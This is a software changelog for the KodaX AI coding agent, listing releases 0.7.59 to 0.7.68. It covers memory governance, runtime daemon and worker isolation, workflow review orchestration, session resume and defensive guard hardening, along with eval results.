- **Frozen FEATURE_259 eval inputs.** The pre-iteration dispatch schema is
  reconstructed from its historical bytes, so later production tool-schema
  improvements cannot mutate the baseline or invite a hash-only CI workaround.
- **Governed-memory Bash guard bypasses.** Commands that directly address
  recognized scoped or legacy memory roots now permit only one simple read-only
  inspection; command chaining, pipelines, redirects, home-relative paths, and
  interpreter writes fail closed at the Bash tool boundary.
- **Memory proposal and review persistence integrity.** Invalid approval
  metadata now produces a store warning and blocks rewrites; project-less review
  drains no longer claim project-owned work; persisted outcome evidence receives
  full shape validation; atomic writes clean temporary files on failure.
- **Memory store lock ownership.** Proposal and lifecycle locks now carry a PID
  plus random owner token, avoid reclaiming stale locks held by a live process,
  and remove a lock only when the releasing owner token still matches. Lifecycle
  state writes now use temporary-file rename instead of direct truncating writes.
- **Interactive resume handoff and large-store startup.** Bare `kodax -r` now
  keeps the selected session through the picker-to-TUI handoff instead of
  exiting, and the picker uses bounded metadata paging instead of repeatedly
  full-reading every matching session before it opens.
- **A2A/configuration release hardening.** Review gaps in remote execution,
  Skill-script admission/isolation, hot reload, listener preparation, binding
  pinning, last-known-good reconciliation, and redacted diagnostics now fail
  closed or retain the prior healthy revision as specified. The public A2A
  server type now exposes its existing readiness wait, validated DNS results
  narrow explicitly to IPv4/IPv6, and safe request-body typing no longer
  depends on an undeclared DOM global, keeping root TypeScript validation green.

## [0.7.68] - 2026-07-12

> Scope note: this release delivers **FEATURE_260**, the KodaX Memory Agent,
> as a thin experimental SDK and governed runtime extension over the existing
> F228 Memory Control Plane. It does not add a second memory database, a
> resident specialist agent, filesystem memory actions, or online self-modification.

### Added

- **Thin experimental Memory Agent SDK.** Added
  `@kodax-ai/agent/experimental-memory` and the root `/experimental-memory`
  entry with scoped `MemorySession` lifecycle, zero-wait passive recall,
  read-only deliberate `query()`, bounded observations, and episode outcomes.
- **Deliberate governed recall for the Action LLM.** A session-bound
  `memory_recall` tool exposes only one `need` field, returns prompt-safe
  low-authority evidence from the same F228 plane, and keeps identity, scope,
  revision, and sequence outside model input.
- **Auditable memory decisions and outcomes.** Trace-only
  `MemoryDecisionReceipt` records candidate/selected/injected refs and policy
  version; accepted Outcome Digests can conservatively link influence without
  storing hidden reasoning or creating a second event store.
- **Bounded episode review and promotion.** Timed-out review work persists in a
  scoped inbox for bounded next-session drain and revalidation. Promotion now
  consults compatible claims before choosing create, evidence update,
  condition refinement, conflict, no-action, reject, or quarantine.

### Changed

- **Memory applicability is exact and fail-closed.** Tenant, user, agent,
  workspace, project, and branch identity participate in deterministic scope
  checks; sibling/cross-user/cross-tenant fallback is prohibited.
- **Memory policy is source-versioned and cache-safe.** `f260-v0.7.68.2`
  binds production reminder rules, evidence rendering, and deliberate-recall
  tool bytes. Passive reminders only affect the dynamic suffix; deliberate
  queries add a normal tool-call/result tail while preserving earlier provider
  cache bytes.
- **Safety-critical boundaries remain deterministic.** Secret filtering,
  memory-file mutation guards, poisoning/source-evidence checks, and governed
  proposal/preview/fingerprint/apply remain zero-violation code gates rather
  than probabilistic LLM recall thresholds.
- **Self-knowledge follows the v0.7.68 capability surface.** `kodax_manual`
  now has a dedicated governed-memory topic, names all 43 built-in slash
  commands under a two-way drift guard, and documents the current 10 SDK
  subpaths plus Runtime and `/experimental-memory` ownership boundaries.

### Fixed

- **Post-review Memory Agent release hardening.** Repository identity now strips
  Git remote userinfo/query credentials before scoped or legacy persistence;
  managed-path guards are Windows-case-safe, protect governance sidecars, and
  fail closed for non-read-only shell access to addressed memory roots. Episode
  reviews use atomic processing claims with stale recovery, while proposal and
  lifecycle stores serialize concurrent read-modify-write updates. Eval manifest
  schema v2 binds untracked file bytes in addition to the tracked patch, corrupt
  raw JSON fails loudly, and summary review state points to the separate
  main-session review artifact instead of remaining permanently pending.
- **Runtime daemon state replacement is atomic.** Daemon lifecycle updates now
  stage and rename `daemon.json` instead of truncating it in place, preventing
  shutdown polling from mistaking a partial write for completed cleanup and
  leaving an orphaned `stopping` process under full-suite load.

### Performance

- **The preregistered v2 memory-routing panel passes all release gates.** On
  `ark/v4flash`, general immediate recall passed 59/60 (98.3%), high-value
  recall 40/40, must-silent 200/200 (Wilson lower 98.1%), paired routing lift
  was +73.3 percentage points with zero control regression, and bounded
  two-decision recovery passed 20/20. The 520-cell panel represented 782,721
  tokens and an estimated $0.004447 against the $0.02 cap. Main-session blinded
  review recommends ship for routing value while documenting that the panel is
  not an end-to-end task-completion claim.

## [0.7.67] - 2026-07-11

> Scope note: a stabilization and agent-efficiency release. **FEATURE_258**
> adds the protocol-neutral external-agent executor plane, **FEATURE_259**
> makes workflow/review orchestration more focused and cost-disciplined, and
> the bounded corrective **FEATURE_261** delivers searchable session resume
> plus safe ACP-session cleanup. GitHub source/binary release work is included;
> npm publication remains a separate operator step.

### Added

- **External Agent Executor Plane and dispatchable catalog.** Host-injected
  executors now share a protocol-neutral registration/catalog/task contract,
  redacted policy-filtered discovery, durable task ledger, recovery, and a
  reference executor. Worker tools, Workflow, Embedded Runtime, and daemon
  clients discover and dispatch the same canonical agent IDs.
- **External-agent SDK and daemon surfaces.** Runtime sessions expose catalog,
  start/continue/cancel/reconcile, event, and task-result operations with
  versioned schemas, configuration revisions, credential-presence checks, and
  public in-process daemon-factory bootstrap support.
- **Focused scoped-review workflow.** `/review --workflow` now uses immutable
  review packets, one primary per scope, an additional authoritative primary
  only for risk-flagged packets, batched fresh verification for candidate
  findings, stable finding IDs, capable synthesis, and an audit artifact.
- **Explicit model-tier intent and route telemetry.** Workflow and substantive
  child briefs carry focused scope/constraints/evidence/output fields plus
  explicit `fast` / `balanced` / `deep` intent. Runtime reports the resolved
  source, fallback, effort, usage, duration, packet-read topology, and token
  coverage without fabricating missing external usage.
- **Searchable session resume picker.** Running `kodax -r` without an ID now
  opens an interactive TUI with incremental search, keyboard selection, title
  completion, pagination, and the full selected session ID. An explicit value
  resolves a complete ID first, then a unique exact title; duplicate titles
  open a narrowed picker rather than silently selecting one.
- **Session listing filters and cursors.** SessionManager, Runtime SDK, and
  daemon protocol listings now accept an exact `surface` filter and an opaque
  continuation `cursor`, applied before the requested page limit.

### Changed

- **Resident workflow context is smaller and discoverable.** The turn-resident
  `run_workflow` hint stays below the deferred-tool budget while the full
  authoring contract remains available through `tool_search`. Recorded
  workflow-shaped plans start directly instead of being expanded into duplicate
  todo/dispatch scaffolding.
- **Review handoffs are structured and conservative.** Positive observations
  are not findings; missing evidence remains `not-verifiable` rather than being
  promoted into a defect; unreasoned severity overrides retain the original
  severity instead of failing the review.
- **Eval execution is value-driven and bounded.** Main-session evidence review
  determines whether a candidate has material value over baseline; executor
  aliases are not reused as judge models. Raw reuse, per-call/round/token/cost
  caps, one bounded structured repair, and provider/model concurrency lanes
  prevent runaway panels.
- **SDK embedder documentation matches the v0.7.67 public surface.** The guide
  now covers external-agent owner/consumer setup and safety boundaries, Runtime
  registration/catalog/task services, exact-surface session pagination,
  run-scoped workflow tiers, live route facts, and durable efficiency reports;
  the English/Chinese subpath tables reflect all 10 published SDK entries.

### Fixed

- **Restricted Workflow scripts preserve the public Agent routing contract.**
  `phase` and FEATURE_258 `target` values now cross the script host boundary
  with fail-loud validation, so generated/saved workflows can route the same
  canonical external Agent IDs as direct Workflow and Worker dispatch.
- **Executor-plane shutdown is terminal and waiter-safe.** Closing the plane is
  idempotent, rejects pending task waits, and prevents later registration,
  catalog, or task operations from recreating executors after owner shutdown.
- **Review/eval trust boundaries fail loudly without replacing real results.**
  Built-in scoped-review outputs are validated against their declared schemas;
  local ledger mirror failures retain the authoritative child result/error;
  Feature 259 baseline reconstruction now requires every exact rewrite and no
  longer leaks candidate-only briefing fields into the baseline.
- **Runtime tests no longer leave detached Node processes behind.** The config
  suite explicitly shuts down its auto-started daemon owner before deleting
  temporary state, and long-running process fixtures self-exit if an abnormal
  test-runner termination prevents normal managed cleanup.
- **External tasks keep identity and terminal state across failures.** A remote
  start followed by ledger failure preserves its executor reference as
  `unknown`; in-flight tasks retain immutable executor bindings across catalog
  updates; task-level mutation queues prevent late callbacks from overwriting a
  terminal snapshot; Workflow external waits honor `timeoutMs`.
- **External task safety and policy boundaries fail closed.** Executor
  availability, health, capability, concurrency, credential presence,
  configuration revision, target side effects, and read-only intent are checked
  before start without exposing secret values.
- **ACP tests no longer pollute real user sessions.** ACP harnesses now use an
  isolated temporary runtime home and session store, with a guard that rejects
  paths under the real user home. ACP sessions remain provisional until the
  first valid prompt instead of persisting an empty `ACP Session` during
  protocol setup.
- **Empty ACP pollution can be audited and recovered safely.**
  `kodax -s cleanup-acp` previews only strict empty ACP matches; explicit
  `--apply-session-cleanup` archives them reversibly instead of deleting data.

### Performance

- **Feature 259 controlled comparison validates the review optimization.** The
  proposed topology passed 8/8 Layer-3 oracle cells versus 6/8 baseline, reduced
  total model tokens 16.9% and output tokens 49.1%, and on standard reviews
  reduced median tokens 57.2%, primary starts 75%, and duplicate packet reads
  83.3%. High-risk multi-area reviews intentionally spend more calls for fresh
  verification and explicit packet coverage.

## [0.7.66] - 2026-07-10

> Scope note: the runtime migration was developed across the v0.7.64-v0.7.66
> planning slots and is released as one v0.7.66 cut; v0.7.64 and v0.7.65 were
> not separately tagged. This release completes FEATURE_253, FEATURE_254, and
> FEATURE_255, and pulls the already implemented FEATURE_256 / FEATURE_257
> isolation work forward into the same release. GitHub source/binary release
> work is included here; npm publication remains a separate operator step.

### Added

- **KodaX Runtime daemon and SDK daemon transport.** Added the local-only
  runtime daemon, named-pipe/Unix-socket transport, `kodax daemon`
  lifecycle commands, and the `@kodax-ai/kodax/runtime` daemon client surface
  used by REPL, ACP, SDK hosts, Space, and IDE-style clients.
- **Runtime host control plane.** The runtime API now exposes multi-session
  session management, run queueing, permission subscriptions/responses,
  artifact upload/reference, model/provider/config/catalog helpers, command and
  skill discovery, diagnostics, and status snapshots across embedded and daemon
  modes.
- **Context/tool exposure optimization gates.** Added small-context tool schema
  pruning and bridge reachability evals so deferred tools stay discoverable
  while small-window providers avoid carrying avoidable schema cost.
- **Optional Worker-hosted Runtime.** SDK embedders can select
  `createKodaXRuntime({ mode: 'embedded', isolation: 'worker' })` for a private
  Runtime in a disposable V8 Worker while keeping the same sessions/runs/events
  service facade. Resource limits, hard-dispose capability negotiation, and
  Worker sidecar packaging are included.
- **Constructed handler Worker isolation.** Activated JavaScript constructed
  handlers execute outside the host V8 isolate, call allowed tools through
  reverse host RPC, hard-terminate CPU loops on timeout, and respawn lazily.

### Changed

- **Unified CLI Runtime and configuration precedence.** Interactive, positional,
  slash-command, and `kodax -p` tasks now all run through `KodaXRuntime`, so
  embedded and daemon modes share one execution boundary. `runtimeMode` is
  persisted in `config.json`; paired settings consistently resolve as explicit
  option > environment > config > default, with semantic camelCase ↔
  `KODAX_UPPER_SNAKE_CASE` mappings across CLI, ACP, and both REPL surfaces.
- **Runtime migration release rollup.** FEATURE_253 (embedded Runtime),
  FEATURE_254 (host/control-plane hardening and context/tool exposure), and
  FEATURE_255 (local daemon transport) were implemented across the
  v0.7.64-v0.7.66 development window and ship together in v0.7.66. The
  implemented Worker-isolation follow-ups FEATURE_256 / FEATURE_257 also ship
  early in this cut instead of waiting for their former v0.7.71/v0.7.72 slots.
- **Release metadata synced to v0.7.66.** Root, lockfile, and workspace package
  versions now agree on `0.7.66`; the release pack-only path produces
  `kodax-ai-kodax-0.7.66.tgz`.

### Fixed

- **Runtime daemon boundary hardening.** Client close now detaches without
  terminating shared daemon peers; event replay keeps monotonic sequence IDs
  across restart; listener failures are isolated; active-run session mutations,
  permission policy, artifact validation, wire errors, frame limits, subscription
  startup races, and method schema validation now fail predictably.
- **Daemon host parity and cleanup.** Interactive daemon runs send an explicit
  JSON-safe options DTO and bridge stream, permission, and abort signals back to
  the REPL. ACP shares its injected session root with the runtime, diagnostic
  sinks restore safely out of order, and LSP child records remain registered
  until process stdio has actually closed.
- **Runtime lifecycle cleanup.** Aborted/closed queued or running runs now settle
  their result promises, pending permissions are rejected and timer-cleaned, and
  daemon startup treats live transitional states as waitable ownership instead
  of falsely unhealthy state.
- **Daemon crash/startup recovery.** Unix socket startup refuses non-socket
  endpoint paths and removes stale non-connectable socket files before binding;
  Windows daemon smoke covers named-pipe start/status/logs/stop/restart and
  verified stale-owner handling.
- **True SDK daemon process ownership.** SDK daemon auto-start now launches a
  detached `daemon serve` process instead of hosting the socket in the caller;
  smoke tests assert a distinct PID and verify detach/reconnect behavior.
- **Transport options fail closed.** Runtime run DTOs reject functions, cycles,
  class instances, and other process-local values before Worker/daemon
  transport instead of silently losing them during JSON serialization.
- **Runtime isolation requirements fail closed in every mode.** Inline Runtime
  creation now rejects `requirements.hardDispose`; Worker-only options without
  Worker isolation and explicit isolation options on daemon mode are rejected
  instead of being ignored.
- **Constructed handler revoke drains queued work.** Disposing a handler marks
  its entry dead before Worker termination, so active, queued, and stale-closure
  calls cannot recreate an untracked Worker after revoke.
- **Portable bridge permission eval follows production semantics.** The
  deterministic FEATURE_254 reachability gate now asserts that `tool_describe`
  and the `tool_call` wrapper stay permission-silent while the concrete target
  is checked exactly once; all four exposure eval files pass (6/6 tests).
- **Standalone release archives retain required sidecars.** GitHub Release
  packaging now includes provider metadata plus semantic, Runtime, and
  constructed-handler Worker files and fails before upload when any sidecar is
  missing.
- **Failed image-path paste remains visible.** If image decoding or loading
  fails, the REPL restores the original path as plain text and shows a bounded
  warning instead of silently consuming the paste.

## [0.7.63] - 2026-07-07

> Scope note: a patch/stability release for SDK session boundaries and release
> hygiene. No planned feature slot was consumed at release time; `FEATURE_244`
> was still targeted at `v0.7.65` before the 2026-07-08 roadmap consolidation.
> This release hardens the public `/session` subpath, keeps
> rewind audit markers out of model context, makes `startKodaX()` wrapper
> session IDs safe around auto-resume, improves `/reload` extension rediscovery,
> and prunes superseded feature-design parking notes from the private feature-doc
> index.

### Added

- **`@kodax-ai/kodax/session` now exports imperative compaction.**
  `compactSession` and its public option/result types are re-exported from the
  root session SDK subpath, with a package-level regression test proving the
  bundled subpath exposes the same session facade hosts use in Space-style
  integrations.
- **Typed rewind transcript entries.** Session lineage now has a dedicated
  `rewind_marker` entry type. `loadFullTranscript()` surfaces it as a structured
  system transcript entry for host scrollback, while `loadSession()` and the
  returned transcript `messages` keep rewind audit markers out of model context.
  Downstream consumers that exhaustively switch on `KodaXSessionEntry` or
  `SessionTranscriptEntryType` should handle `rewind_marker`.
- **`/reload` rediscovers extensions.** The REPL reload command now re-scans
  default and configured extension entrypoints from disk, creates the extension
  runtime on demand, hot-reloads already loaded modules, loads newly discovered
  modules, and reports separate "Extensions reloaded" / "Extensions loaded"
  counts.

### Changed

- **SDK session boundary hardening.** `startKodaX()` now threads wrapper-generated
  session IDs into forwarded run options only when the caller did not provide an
  explicit ID and did not request auto-resume/resume discovery. Generated handle
  IDs are marked internally so the "session.id without storage" warning remains
  useful for caller-provided IDs without warning on the wrapper's own handle ID.
- **Feature-design index cleanup.** Superseded/parked planning-only docs for old
  `v0.7.67`, `v0.7.68`, `v0.7.71`, `v0.7.73`, and `v0.7.74` slots were pruned.
  At release time, active targets remained in the indexed docs: `FEATURE_228`
  in `v0.7.62`, `FEATURE_231` in `v0.7.70`, `FEATURE_235` in `v0.7.75`,
  `FEATURE_108` in `v0.7.95`, and `FEATURE_225` in `v0.7.100`.

### Fixed

- **Rewind selection skips synthetic/tool-result user entries.** `/rewind`
  previous-turn selection now walks the active lineage path and ignores
  tool-result-only user messages plus synthetic user notices, avoiding accidental
  rewinds to tool protocol plumbing instead of the previous real user prompt.
- **Rewind helpers reject sidecar targets.** Direct lineage rewinds now reject
  label/client/goal/archive/rewind-marker side-state entries and legacy rewind
  compactions remain context-silent even if a damaged old session points
  `activeEntryId` at one.
- **`/reload` reports successful extension reloads.** Failed hot-reload attempts
  are reported only in the failure count instead of also inflating the
  "Extensions reloaded" success count.
- **Transcript layout fixtures are deterministic.** Duration-sensitive transcript
  layout tests now use fixed timestamps instead of `Date.now()`, removing a
  release-gate flake without changing runtime behavior.

## [0.7.62] - 2026-07-06

> Scope note: a memory-governance release plus interaction polish. **FEATURE_228**
> upgrades FEATURE_224's memory handoff lane into a governed memory control plane:
> one proposal store, typed memory refs, preview/fingerprint-guarded writes,
> deterministic task-aware memory hints, curator reports, and thin `/memory`
> commands. The release also completes the `ask_user_question` interaction gap
> tracked as issue 112 by adding free-text input, multi-select bounds, and
> host-side custom-input answers. No vector database, embeddings service, or
> second memory store is introduced.

### Added

- **Unified Memory Control Plane + Memory Governance (FEATURE_228).** Added the
  agent-layer `MemoryControlPlane` and typed memory contracts for refs,
  snapshots, action proposals, approvals, apply results, governance findings,
  memory packs, and review plans. F224 `memdir_handoff` / `reasoning_handoff`
  proposals are projected through the memory controller instead of copied into a
  second store, keeping `/learn` and `/memory` on one proposal lifecycle.
- **Memory command surface and deterministic prompt hints.** `/memory inbox`,
  `/memory pending`, `/memory show`, `/memory approve`, `/memory reject`, and
  `/memory curate` are thin REPL adapters over the agent-layer controller.
  Coding prompt assembly now injects only a bounded memory index preview plus
  small governed memory hints; topic bodies remain on-demand reads, and selected
  memory refs are surfaced as trace metadata instead of prompt body noise.
- **Governance and feedback review hooks.** Memory governance can report duplicate,
  conflict, stale, quarantined, orphaned, and no-op findings without mutating
  memory. Automatic curator runs are maintenance-window based, write bounded JSON
  audit reports, retain only the newest 200 reports, and never rewrite memory
  files. Feedback-triggered review accepts bounded candidate refs and requires
  the normal approval path before mutation.

### Changed

- **`ask_user_question` now supports open-ended answers.** The tool schema and
  host contracts accept `kind: "input"`, `multi_select`, selection bounds, and
  default-on custom input options (`allow_custom_input: false` opts out). REPL
  select dialogs use focus navigation, space toggles multi-select entries, Enter
  submits focused/selected values, and custom answers are returned as normalized
  `choice` / `choices` plus `custom_inputs` metadata.
- **Memory approval requires preview fingerprints.** `approveProposal` now
  requires fingerprints from a shown preview and fails closed on stale target or
  `MEMORY.md` changes. Already-applied target/index writes complete idempotently
  with warnings instead of rewriting identical content.

### Fixed

- **Resolved issue 112: `ask_user_question` interaction incompleteness.** The
  model can now request free-text input, multi-select choices, and custom "Other"
  answers without forcing fragile pre-combined option sets.
- **User-scroll residual-cell repaint guard.** Alt-screen scroll repaint now
  erases and repaints the affected visible rows before the normal diff pass, so
  stale wide-char or skipped-cell residue cannot remain after user-driven
  transcript scrolling.

## [0.7.61] - 2026-07-06

> Historical release record: the command-aware lossy-filter behavior below is
> what v0.7.61 shipped, not the current default. The 2026-07-14 correction is
> recorded under Unreleased, ADR-050, and the FEATURE_251 design/test guide.

> Scope note: a token-efficiency + workflow-reliability release. **FEATURE_251** adds command-aware
> in-tool output compression (an rtk-style Token Killer port) inside KodaX's own `bash` tool layer,
> so a noisy `git diff` / test run / package-install / docker-build no longer spends thousands of
> context tokens — the compressed body is what context accounting actually counts, and every lossy
> summary keeps a raw-recovery path. **FEATURE_252** lands the deterministic half of workflow-quality
> preflight: a pre-start AST/dataflow lint that hard-fails weak-model authoring contract bugs before
> a workflow can run. Both are deterministic (no prompt change, no LLM eval). The release also fixes a
> workflow-start crash: `typescript` is now a runtime dependency of `@kodax-ai/agent` because the
> quality lint uses the TypeScript compiler API on the workflow hot path. No public runtime type is removed.

### Added

- **Historical implementation — tool-output semantic compression / command-aware in-tool Token Killer (FEATURE_251, ADR-050).** A new `packages/coding/src/tools/output-filters/` module compressed bash `stdout`/`stderr` **body** after decode, before the `Command:` / `Exit:` header was assembled, at the single `bash.ts` close-handler integration point (so both the SA and AMA dispatch paths were covered by one change). It shipped a lossless generic layer (ANSI strip), compiled stateful filters (`git-diff`, `git-log`, `git-status`, `test-runner` failure-focus, `lint` diagnostic grouping, `json-output` / NDJSON structural summary), and a built-in declarative long-tail table (package-manager / docker / infra CLI progress). Hard constraints at release time: the `Command:` / `Exit:` header was preserved verbatim (FEATURE_185 hits-ledger depends on it); the generic layer was lossless-by-construction with `never_worse` as a size-only backstop; and every lossy filter persisted raw decoded body before appending a recovery hint. Isolated Layer-1 fixtures measured shorter bodies, but did not measure recovery reads, extra inference rounds, or task-level evidence quality; they are historical measurements, not current release gates or end-to-end benefit claims. Current default behavior is the correction described above. Human test guide: `docs/test-guides/FEATURE_251_v0.7.61_TEST_GUIDE.md`.
- **Deterministic workflow-quality preflight lint (FEATURE_252).** A new `packages/agent/src/workflow/quality-lint.ts` (`lintRestrictedWorkflowSource` / `assertRestrictedWorkflowQuality`, exported from the workflow package) runs inside restricted workflow module materialization (`script-runner.ts` `createRestrictedWorkflowModule`) and in the coding workflow host with host-policy `maxAgents`, so structural contract violations fail before a run can start — matching the existing inline-smoke hard-fail feedback loop. It hard-fails three deterministic contract classes only: (1) an unawaited workflow-command variable (`wf.runAgent` / `wf.spawnAgent` / `wf.wait` / `wf.synthesize` / `wf.workflow` / `wf.artifact`) used in a boolean position (`if (x)`, `!x`, ternary test, `x && …`, `x || …`, loop test) — a case a runtime Proxy cannot catch because object truthiness has no Proxy trap; (2) top-level structured-output field access (`result.findings`, `result.summary`, …) when the fields belong under `result.structured`; and (3) a literal `[...]`/`[...].map(...)` agent fanout whose static upper bound exceeds `manifest.maxAgents` or a known host cap. Review/verifier/generic quality heuristics are intentionally **not** emitted as model-visible warnings (a lightweight AST pass cannot distinguish a weak workflow from a valid optimized one, and surfacing them causes needless rewrite churn). Human test guide: `docs/test-guides/FEATURE_252_v0.7.61_TEST_GUIDE.md`.

### Changed

- **Review/audit workflow templates make adversarial verification explicit (FEATURE_252 Layer 2).** The default generator/authoring fixtures for `adversarial-verification` shapes now use explicit verifier stages and `task_id:` evidence refs, so the desired shape — finders → adversarial verifiers → synthesis of confirmed findings — is stated in the template rather than left to a weak authoring model to infer. This reduces reliance on lint and is robust to capability-limited authors.

### Fixed

- **Workflow-start crash: `typescript` promoted to a runtime dependency of `@kodax-ai/agent`.** The FEATURE_252 quality lint imports the TypeScript compiler API (`ts.createSourceFile`, …) and runs on every workflow start via `assertRestrictedWorkflowQuality`. With `typescript` only in `devDependencies`, a bundled/published build resolved no `typescript` module at that call site, throwing an uncaught error that crashed the process before the workflow ran (leaving the terminal in a corrupted mouse/alt-screen state). Moving `typescript` to `dependencies` fixes the workflow-front crash.

## [0.7.60] - 2026-07-05

> Scope note: an F250 refactor + Space SDK rollup. **FEATURE_250** brings the deferred-tool
> progressive-disclosure mechanism — previously SA-path-only — to the AMA/AMAW **managed** tool
> path, so cache-cold managed turns carry one-line search hints instead of full descriptions for
> the repo-intelligence + web/code/goal tools. Tool `input_schema` is unchanged, so every deferred
> tool stays directly callable; the full description is fetched on demand via `tool_search`.
> Transparent (no user-facing behavior change) and prompt-additive only (a two-line
> `code_search`/`semantic_lookup` teaching block). The release also lands **CAP-099 (Space SDK):
> live turn attribution + structured transcript** — streamed activity events carry session/turn
> identity, explicit turn-boundary events share one per-session sequence, and client-only
> transcript notices are persisted without ever entering the model context. All additive and
> profile/host-gated; the default path stays unchanged when a host does not read the new metadata.
> No public runtime type is removed.

### Added

- **`code_search` / `semantic_lookup` teaching in the Worker REPO INTELLIGENCE prompt (FEATURE_250).** A two-line, eval-justified teaching block: the floor-tier alias under-adopted the hint-only tools on ambiguous tasks (75%), and the teaching recovered adoption to 100% while being strictly non-negative on every other alias.
- **CAP-099 live turn attribution — session/turn identity on streamed events (Space SDK).** A shared live-turn scope (`createLiveTurnScope` / `withLiveTurnAttribution`, `event-emitter.ts`) stamps `KodaXActivityEventMeta` (`sessionId` / `seq` / `turnId` / `deliveryId` / `timestamp`) onto every streamed activity callback, and explicit turn-boundary events (`emitTurnStarted` / `emitTurnCompleted` / `emitTurnFailed`) share one monotonic per-session sequence — so an SDK host can route streamed assistant events to the owning turn's UI bubble by turn ownership instead of fragile ordering-by-observation. Threaded through messaging (queue/drain), orchestration (idle-yield), run-substrate, runner-driven, run-workflow, and dispatch-child-tasks; a host that ignores the metadata sees unchanged behavior. New `cap-099-live-turn-attribution` contract test; existing `cap-005/006/007/041/046/054/086` event-contract tests updated for the added meta parameter.
- **Client-only transcript notices + structured transcript entries (CAP-099, Space SDK).** The persisted transcript gains structured entry types (`message` / `compaction` / `branch_summary` / `client_notice` / `task_result`) with `source` + `turnId`. A `client_notice` is persisted as a lineage entry, NOT a model message: `loadSession()` (active model context) omits it while `loadFullTranscript()` returns it with `type: 'client_notice'`, `source: 'client'`, and `payload.entersModelContext === false` — so a host can render client-side scrollback notices without polluting the model's context. SDK embedder guide updated (`public_docs/sdk/embedder-guide.md`).
- **Transcript clone provenance for SDK hosts (CAP-099, Space SDK).** Lineage entries now carry optional `logicalId` / `sourceEntryId`, and `loadFullTranscript().transcriptEntries[]` always exposes a stable `logicalId` (falling back to `entryId` for old sessions). Forked/cloned entries keep the source `logicalId` and point `sourceEntryId` at the root physical source entry, so hosts can fold cloned history precisely without guessing from role/content/timestamp or `[compacted]` placeholders. `loadFullTranscript()` remains raw append-order scrollback; it does not silently merge branches or hide compaction notices.

### Changed

- **Progressive disclosure on the AMA/AMAW managed tool path (FEATURE_250).** `buildAgentToolsFromRegistry` (`agent-chain.ts`) now hint-swaps the 13 non-mcp deferred tools — repo-intel (`repo_overview`, `changed_scope`, `module_context`, `symbol_context`, `process_context`, `impact_estimate`), web/code (`web_search`, `web_fetch`, `code_search`, `semantic_lookup`), and goal (`get_goal`, `create_goal`, `update_goal`) — to their `DEFERRED_TOOL_HINTS` one-liner. The swap is a one-time build-time change (the managed `Agent.tools` is a static array), so the tools[] prefix is cache-stable turn-to-turn. `mcp_*` (5) stay resident (remote-mutation risk + not covered by the reachability eval; conservative hold gated on a future MCP-runtime eval); `run_workflow` is untouched (host-conditional per FEATURE_246/249). Two eval panels (5-alias coding-plan) confirm no reachability harm: DEFER_SAFE 5/5, 0% read/grep fallback, and V_teach 100% adoption on ambiguous tasks. KodaX's hint-swap keeps the tool in `tools[]` with `input_schema` intact — safer than the reference agents (Claude Code / Codex) which remove deferred tools from the wire and therefore gate deferral off for weak models.
- **Inline workflow preflight hardening (FEATURE_246).** The inline `run_workflow` restricted-smoke preflight now rejects two more classes of weak-model authoring bug before a workflow starts: (1) an unawaited `wf.runAgent` / `wf.synthesize` result that leaks into a property read, JSON serialization, or assignment — a Proxy trap throws `wf.<method> result must be awaited before …` instead of silently coercing a pending command; and (2) a `manifest.readOnly=true` workflow that spawns a write-capable child (`readOnly:false`) — it now throws at preflight instead of running. This is the deterministic-structural groundwork for the planned FEATURE_252 workflow-quality lints (v0.7.61).

### Fixed

- **`tool_search` result protected from microcompaction pruning (FEATURE_250).** `tool_search` is added to `PRUNE_PROTECTED_TOOLS` (`compaction.ts`). On the managed path a deferred tool's full description lives only in the `tool_search` result message (the static `Agent.tools` array cannot make a description resident mid-session), so the unconditional 20-turn prune would otherwise silently stub the only teaching surface for any non-prompt-taught deferral.
- **Headless SDK resume recovers `<task-completed>` results + per-message timestamps (Space SDK).** Two resume/persistence fixes for headless SDK embedders; the KodaX TUI is byte-unchanged. (1) `dispatch_child_task` / `run_workflow` `<task-completed>` result banners are spliced into the transcript as synthetic user messages that the reconstruction helper drops, so a headless host with no `uiHistory` lost them on resume — they are now tagged `_source: 'task-completed'` (only when a task-notification actually drained) and restored as a distinct `task_completed` event seed at their transcript position; when `uiHistory` is present the derived seed is discarded, so the CLI does not double-render. (2) `KodaXMessage` carried no time, so `createSessionLineage` stamped a whole managed task's messages with one accounting-millisecond and per-message "N ago" footers collapsed — an additive `KodaXMessage.timestamp?` is now stamped at each message-finalization site and preferred by `createSessionLineage`. The dedup fingerprint ignores timestamp (resume dedup unaffected); old sessions fall back to accounting-time.
- **Goal-state tool results protected from microcompaction pruning.** `get_goal` / `create_goal` / `update_goal` are added to `PRUNE_PROTECTED_TOOLS` (`compaction.ts`) alongside `tool_search`. The canonical goal state persists as session-lineage entries, but these tool results are the model-visible status snapshots and lifecycle-transition receipts (short, low-frequency, control-plane-like), so microcompaction's 20-turn prune no longer stubs the model's view of `/goal` state. (v0.7.60 review follow-up.)

## [0.7.59] - 2026-07-03

> Scope note: a rollup release on top of v0.7.58. **FEATURE_248** and **FEATURE_249** extend
> workflow *activation*: the AMAW Worker now carries a mode-level standing directive that
> defaults substantive work to orchestrating cross-checking agents, and AMA can activate
> `run_workflow` from an explicit natural-language request. The release also lands the Space SDK
> R1-R6 capability hardening, an ark-coding lineup refresh, and several workflow-runtime + SDK
> parity fixes. All prompt-only / additive; no public runtime type is removed.

### Added

- **AMA natural-language workflow activation (FEATURE_249).** `buildWorkflowToolHost` is widened so AMA — not only AMAW — hosts the `run_workflow` tool. AMA activates it on an explicit natural-language request (the tool is available and LLM-native, with no standing directive); AMAW additionally self-activates on complexity via the FEATURE_248 directive. SA is unchanged (fails the gate + `SA_SOLO_EXCLUDE_TOOLS`). The F248 directive stays strictly AMAW-only through an independent `amawOrchestrationAvailable` gate that is structurally separate from the tool host.
- **Host-facing Worker workflow-authoring entrypoint + resume replay telemetry (Space SDK R1/R2).** A non-coding SDK host can drive the scout-then-author Worker authoring path directly, and same-session resume now emits replay telemetry (an `agent_replayed` event) so a host can observe cache hits when a run resumes.

### Changed

